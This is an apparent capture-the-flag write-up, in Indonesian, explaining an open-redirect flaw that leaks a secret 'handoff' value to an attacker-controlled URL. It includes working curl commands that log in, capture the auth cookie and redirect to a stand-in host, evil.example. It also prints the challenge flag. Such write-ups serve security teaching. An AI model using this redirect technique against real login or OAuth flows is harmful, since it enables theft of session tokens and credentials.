---
ctf: "RIFFHACK 2026"
kategori: "Web"
challenge: "The Trusting Login Desk"
flag: "bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}"
teknik: "Open redirect pada GET /api/auth/complete?next=<URL> menambahkan ?handoff=<secret> ke URL milik attacker"
---

# The Trusting Login Desk — RIFFHACK 2026 (Web)

## Deskripsi Singkat

Open redirect yang menambahkan nilai sensitif ke URL yang dikontrol attacker. Bug confused-deputy `redirect_uri` OAuth klasik, didramatisasi.

## Analisis

Bundle client `/auth` mengarahkan ke `/api/auth/complete?next=<value>` setelah login. Probing handler-nya: path relatif → 500; URL absolut → 307 dengan query parameter `handoff` ditambahkan. Perilaku ini menandakan server melakukan `new URL(next)`-parsing atas input dan menambahkan query parameter ke URL hasil parsing sebelum mengeluarkan 307.

## Eksploitasi / Solusi

```bash
COOKIE=$(curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' \
  http://159.89.230.27/api/auth/login -D - \
  | awk -F'[=;]' '/auth-token/{print "auth-token="$2}')

curl -sik -b "$COOKIE" \
  "http://159.89.230.27/api/auth/complete?next=https://evil.example/" \
  | sed -n 's/^location: //ip'
```

Output:

```
https://evil.example/?handoff=bitflag%7Btru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts%7D
```

## Catatan / Insight

Di dunia nyata, `handoff` bisa jadi session token, authorization code OAuth, atau tiket SSO sekali-pakai — nilai yang sengaja dikirim server ke "halaman berikutnya" karena di dunia yang waras halaman berikutnya itu adalah aplikasi yang sama. Begitu server gagal memvalidasi bahwa `next` adalah salah satu halamannya sendiri, attacker berjalan pergi membawa kredensial.

## Flag

```
bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}
```
